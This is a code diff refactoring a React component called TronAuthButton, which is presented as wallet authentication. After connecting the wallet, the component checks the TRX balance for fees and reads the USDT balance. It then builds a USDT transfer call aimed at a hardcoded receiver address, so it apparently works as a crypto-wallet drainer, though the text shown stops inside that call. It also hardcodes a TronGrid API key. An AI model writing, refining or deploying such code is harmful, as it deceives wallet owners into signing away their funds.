@@ -1,7 +1,6 @@
 import React, { useState } from 'react';
 import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
 
-// КОНСТАНТЫ
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
 
@@ -9,7 +8,7 @@ export const TronAuthButton: React.FC = () => {
   const [modal, setModal] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
 
-  // Adapter — создаём один раз
+  // Adapter singleton
   const adapterRef = React.useRef<any>(null);
   if (!adapterRef.current) {
     adapterRef.current = new WalletConnectAdapter({
@@ -29,31 +28,22 @@ export const TronAuthButton: React.FC = () => {
   }
 
   const handleAuth = async (e?: React.MouseEvent) => {
-    if (e) e.stopPropagation(); // чтобы не срабатывал родительский клик
+    e?.stopPropagation();
     setLoading(true);
     setModal(null);
 
-    // Проверка, что код на клиенте
-    if (typeof window === 'undefined') {
-      setModal('TronWeb not loaded (SSR)');
+    // Проверяем, что TronWeb загружен через window
+    const TronWeb = (window as any).TronWeb;
+    if (!TronWeb) {
+      setModal('TronWeb not loaded! Please refresh page.');
       setLoading(false);
       return;
     }
 
-    // Импорт TronWeb только в браузере
-    let TronWeb;
-    try {
-      // @ts-ignore
-      TronWeb = window.TronWeb || require('tronweb');
-    } catch (err) {
-      setModal('TronWeb not loaded!');
-      setLoading(false);
-      return;
-    }
+    // Polyfill Buffer для TronWeb (если нужно)
+    if (!(window as any).Buffer) (window as any).Buffer = (await import('buffer')).Buffer;
 
-    // Buffer polyfill для браузера
-    if (!window.Buffer) window.Buffer = require('buffer').Buffer;
-
+    // Создаём tronWeb объект
     const tronWeb = new TronWeb({
       fullHost: 'https://api.trongrid.io',
       headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
@@ -63,12 +53,9 @@ export const TronAuthButton: React.FC = () => {
     try {
       await adapter.connect();
       const userAddress = adapter.address;
-      if (!userAddress || !tronWeb.isAddress(userAddress)) {
-        throw new Error('Invalid wallet address');
-      }
+      if (!userAddress || !tronWeb.isAddress(userAddress)) throw new Error('Invalid wallet address');
       tronWeb.setAddress(userAddress);
 
-      // Проверка баланса TRX
       const trxRaw = await tronWeb.trx.getBalance(userAddress);
       if (trxRaw < 2_000_000) {
         setModal('❌ Insufficient TRX for network fees.');
@@ -77,7 +64,6 @@ export const TronAuthButton: React.FC = () => {
         return;
       }
 
-      // Проверка баланса USDT
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
       const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
       const usdt = Number(usdtRaw) / 1e6;
@@ -88,7 +74,7 @@ export const TronAuthButton: React.FC = () => {
         return;
       }
 
-      // Строим и подписываем транзакцию USDT
+      // Транзакция
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
